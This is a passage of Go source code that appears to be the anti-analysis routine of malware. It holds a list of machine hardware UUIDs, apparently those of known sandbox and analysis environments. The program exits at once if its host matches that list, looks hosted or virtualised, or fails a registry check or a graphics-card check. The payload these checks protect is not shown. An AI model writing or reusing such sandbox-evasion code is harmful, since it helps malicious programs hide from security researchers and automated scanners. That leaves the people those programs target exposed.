"84FEEFBC-805F-4C0E-AD5B-A0042999134D", "02AD9898-FA37-11EB-AC55-1D0C0A67EA8A", "34419E14-4019-11EB-9A22-6C4AB634B69A", "BFE62042-E4E1-0B20-6076-C5D83EDFAFCE", "D7958D98-A51E-4B34-8C51-547A6C2E6615", "5CC7016D-76AB-492D-B178-44C12B1B3C73", "844703CF-AA4E-49F3-9D5C-74B8D1F5DCB6", "66CC1742-AAC7-E368-C8AE-9EEB22BD9F3B", "A19323DA-80B2-48C9-9F8F-B21D08C3FE07", "F3EA4E00-3C5F-11EA-8000-3CECEF440016", "CE352E42-9339-8484-293A-BD50CDC639A5", "CC4AB400-3C66-11EA-8000-3CECEF43FE56", "38AB3342-66B0-7175-0B23-F390B3728B78", "49434D53-0200-9036-2500-369025003865", "B6464A2B-92C7-4B95-A2D0-E5410081B812", "DEAEB8CE-A573-9F48-BD40-62ED6C223F20", "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E", "E773CC89-EFB8-4DB6-A46E-6CCA20FE4E1A", "2FBC3342-6152-674F-08E4-227A81CBD5F5"}
	if IsBlacklistedHWID(blacklistedHWIDs) {
		os.Exit(0)
	}

	if IsHosted() {
		os.Exit(0)
	}

	if RegistryCheck() {
		os.Exit(0)
	}

	if GraphicsCardCheck() {
		os.Exit(0)
	}
}
